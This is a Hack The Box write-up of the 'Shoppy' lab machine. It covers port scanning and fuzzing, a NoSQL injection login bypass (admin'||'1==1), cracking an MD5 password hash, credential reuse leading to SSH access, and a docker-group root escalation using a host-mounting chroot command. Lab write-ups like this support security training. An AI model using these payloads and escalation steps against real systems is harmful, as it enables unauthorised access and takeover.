---
title: Hack The Box - Shoppy
date: 2023-02-12
categories: [hackthebox]
tags: [linux,easy,nosql]
comments: true
toc: true
---
<img src="/assets/Hackthebox/Shoppy/0.png"  width="90%" height="70%">

## RECON

### NMAP

Starting with `nmap`, nmap shows only port `22(ssh)` , `80(http)`  are open.
- port22: OpenSSH
- port80: nginx1.23.1: redirects tohttp://shoppy.htb
```bash
$sudo nmap 10.10.11.180 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-16 12:40 +0545 
Nmap scan report for shoppy.htb (10.10.11.180) 
Host is up (0.32s latency). 
Not shown: 998 closed tcp ports (reset) 
PORT   STATE SERVICE 
22/tcp open  ssh 
80/tcp open  http 
Nmap done: 1 IP address (1 host up) scanned in 5.15 seconds
```

```bash
$sudo nmap -sC -sV -p 22,80 10.10.11.180 -oN shoppy.nmap 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-16 12:41 +0545 
Nmap scan report for shoppy.htb (10.10.11.180) 
Host is up (0.28s latency). 
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA) 
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA) 
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519) 
80/tcp open  http    nginx 1.23.1 
|_http-title:             Shoppy Wait Page 
|_http-server-header: nginx/1.23.1 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 17.59 seconds
```

### Port - 80

On Browsing `10.10.11.180`  it redirects us to `shoppy.htb` . so adding it to our /etc/hosts  file.

```bash
$cat /etc/hosts
10.10.11.180 shoppy.htb
```
![](/assets/Hackthebox/Shoppy/1.png)

Visiting http://shoppy.htb/  revealed a straightforward countdown page announcing the upcoming release of Shoppy Beta.


### Directory Fuzzing

```bash
$sudo ffuf -u http://shoppy.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
        /'___\  /'___\           /'___\ 
       /\ \__/ /\ \__/  __  __  /\ \__/ 
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ 
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ 
         \ \_\   \ \_\  \ \____/  \ \_\ 
          \/_/    \/_/   \/___/    \/_/ 
       v1.3.1 Kali Exclusive <3 
________________________________________________ 
 :: Method           : GET 
 :: URL              : http://shoppy.htb/FUZZ 
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
 :: Follow redirects : false 
 :: Calibration      : false 
 :: Timeout          : 10 
 :: Threads          : 40 
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405 
________________________________________________ 
# directory-list-2.3-small.txt [Status: 200, Size: 2178, Words: 853, Lines: 57] 
images                  [Status: 301, Size: 179, Words: 7, Lines: 11] 
login                   [Status: 200, Size: 1074, Words: 152, Lines: 26] 
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1] 
assets                  [Status: 301, Size: 179, Words: 7, Lines: 11] 
css                     [Status: 301, Size: 173, Words: 7, Lines: 11] 
Login                   [Status: 200, Size: 1074, Words: 152, Lines: 26] 
js                      [Status: 301, Size: 171, Words: 7, Lines: 11]
```
Found a login page. http://shoppy.htb/login

![](/assets/Hackthebox/Shoppy/2.png)

After testing it for login bypass using sql injection  it did not work.

### Authentication Bypass NoSQL

After couple minutes of experimenting with the authentication logic, we notice that it may be a `MongoDB NoSQL  database` running.

We can bypass the authentication logic via:
`admin'||'1==1`  which always returns true.

Once we're logged in, we see a `minimalistic admin panel`.

![](/assets/Hackthebox/Shoppy/3.png)

Entering the same payload on search bar  .we get a list of `users` and their `hashes`.

![](/assets/Hackthebox/Shoppy/4.png)

![](/assets/Hackthebox/Shoppy/5.png)

### Hash cracking

Using `hashcat` to crack obtained `md5` hash.
```bash
$sudo hashcat -m 0 hash /usr/share/wordlists/rockyou.txt

$sudo hashcat -m 0 --show hash  
6ebcea65320589ca4f2f1ce039975995:remembermethisway
```
we were able to crack hash for the user josh.Tried to use this credential to login into the SSH account of user josh  but got login failed.

### Vhost Discovery via ffuf

Using `ffuf` to enumerate `vhosts`. 
```bash
$sudo ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb -H "Host: FUZZ.shoppy.htb" -mc 200 
        /'___\  /'___\           /'___\ 
       /\ \__/ /\ \__/  __  __  /\ \__/ 
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ 
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ 
         \ \_\   \ \_\  \ \____/  \ \_\ 
          \/_/    \/_/   \/___/    \/_/ 
       v1.3.1 Kali Exclusive <3 
________________________________________________ 
 :: Method           : GET 
 :: URL              : http://shoppy.htb 
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt 
 :: Header           : Host: FUZZ.shoppy.htb 
 :: Follow redirects : false 
 :: Calibration      : false 
 :: Timeout          : 10 
 :: Threads          : 40 
 :: Matcher          : Response status: 200 
________________________________________________ 
mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1]
```
Vhost Bruteforce found a new host `mattermost.shoppy.htb`.
Let us add it to our hosts file.
```bash
$cat /etc/hosts
10.10.11.180 shoppy.htb mattermost.shoppy.htb
```
on browsing  `http://mattermost.shoppy.htb` it redirects us to a login page.

![](/assets/Hackthebox/Shoppy/6.png)

we found out that we can login with the credentials of `josh` user found earlier.

![](/assets/Hackthebox/Shoppy/7.png)

Going through the webpage we found out credentials for `jaeger`  user on the `Deploy Machine Channel`.

![](/assets/Hackthebox/Shoppy/8.png)

## Shell as Jaeger 

We can now ssh into the box using this credentials. 
`jaeger: Sh0ppyBest@pp!`
```bash
$sudo ssh jaeger@10.10.11.180 
Connecting to 10.10.11.180:22... 
Connection established. 
To escape to local shell, press 'Ctrl+Alt+]'. 
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64 
The programs included with the Debian GNU/Linux system are free software; 
the exact distribution terms for each program are described in the 
individual files in /usr/share/doc/*/copyright. 
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent 
permitted by applicable law. 
/usr/bin/xauth:  file /home/jaeger/.Xauthority does not exist 
jaeger@shoppy:~$
```

User `jaeger` is allowed to run `password-manager`  as `deploy`.
```bash
jaeger@shoppy:~$ sudo -l 
Matching Defaults entries for jaeger on shoppy: 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin 
User jaeger may run the following commands on shoppy: 
    (deploy) /home/deploy/password-manager
```

But when we try to run `password-manager`  as deploy user. it prompts us for master password.
```bash
jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager 
[sudo] password for jaeger: 
Welcome to Josh password manager! 
Please enter your master password:
```
Tried to use the same password found earlier of user `jaeger` i.e  `Sh0ppyBest@pp!` but it didnot work. 


## Shell as Deploy

on closely checking at the contents of  `password-manager` found in the home  directory of `deploy` user , we can see that the password as `Sample`.
Password-manager file contains the credential `deploy : Deploying@pp!`

```bash
jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager 
Welcome to Josh password manager! 
Please enter your master password: Sample 
Access granted! Here is creds ! 
Deploy Creds : 
username: deploy 
password: Deploying@pp!
```
we can use this credentials to switch user as deploy.

```bash
jaeger@shoppy:/home/deploy$ su - deploy 
Password: 
$ whoami 
deploy
```


## Shell as Root

on checking the id  of deploy we can see that deploy is a member of `docker`  group.We probably are in a docker container .
```bash
deploy@shoppy:~$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

we can escape the `docker` container and esclate our privilege as root  using the following `docker` command.
```bash
deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh 
# whoami 
root 
# id 
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo) 
#
```
and we are root.